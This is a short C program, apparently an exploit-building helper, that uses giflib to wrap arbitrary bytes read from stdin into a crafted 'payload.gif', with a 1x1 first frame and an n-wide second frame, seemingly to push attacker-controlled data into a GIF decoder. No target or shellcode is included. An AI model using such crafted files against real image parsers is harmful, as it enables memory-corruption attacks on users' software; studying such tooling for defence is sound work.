#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <gif_lib.h>

#define example_name "example.gif"
#define output_name "payload.gif"

typedef unsigned char byte;

int main(int argc, char const *argv[])
{
    unsigned long n;
    int error;
    GifFileType *example, *output;
    SavedImage frame;
    byte *payload;
    if (argc != 2) {
        puts("Usage :");
        puts("./gifgen n");
        puts("With n the length of the payload");
        exit(1);
    }
    n = strtoul(argv[1], NULL, 10);
    payload = (byte *) malloc(n);
    read(fileno(stdin), payload, n);

    if ((example = DGifOpenFileName(example_name, &error)) == NULL) {
    fprintf(stderr, "\x1b[31mFailed to open example gif file %s : %s\n\x1b[0m", example_name,
                GifErrorString(error));
        _exit(1);
    }

    if (GIF_ERROR == DGifSlurp(example)) {
        fprintf(stderr, "\x1b[31mFailed to read the rest of the example %s : %s\n\x1b[0m",
                example_name, GifErrorString(example->Error));
        _exit(1);
    }

    output = EGifOpenFileName(output_name, false, &error);
    if (!output) {
        fprintf(stderr, "\x1b[31mOpening output file failed\n\x1b[0m");
        _exit(1);
    }

    output->SWidth = n;
    output->SHeight = 1;
    output->SColorResolution = example->SColorResolution;
    output->SBackGroundColor = example->SBackGroundColor;
    
    if (example->SColorMap) {
        output->SColorMap =
            GifMakeMapObject(example->SColorMap->ColorCount, example->SColorMap->Colors);
    } else {
        output->SColorMap = NULL;
    }

    //first frame is empty
    frame.ImageDesc.Left = example->SavedImages[0].ImageDesc.Left;
    frame.ImageDesc.Top = example->SavedImages[0].ImageDesc.Top;
    frame.ImageDesc.Width = 1;
    frame.ImageDesc.Height = 1;
    frame.ImageDesc.Interlace = example->SavedImages[0].ImageDesc.Interlace;
    frame.ImageDesc.ColorMap = example->SavedImages[0].ImageDesc.ColorMap;
    frame.ExtensionBlockCount = 0;
    frame.ExtensionBlocks = NULL;
    frame.RasterBits = payload;
    GifMakeSavedImage(output, &frame);


    //second frame contains the payload
    frame.ImageDesc.Width = n;
    frame.ImageDesc.Height = 1;
    GifMakeSavedImage(output, &frame);


    if (EGifSpew(output) == GIF_ERROR) {
        fprintf(stderr, "\x1b[31mFailed to write to file\n\x1b[0m");
        EGifCloseFile(output, &error); // Let's ignore errors while closing
        exit(1);
    }


    if (GIF_ERROR == DGifCloseFile(example, &error)) {
        fprintf(stderr, "\x1b[31mFailed to close example %s: %s\n\x1b[0m", example_name,
                GifErrorString(error));
        _exit(1);
    }

    return 0;
}
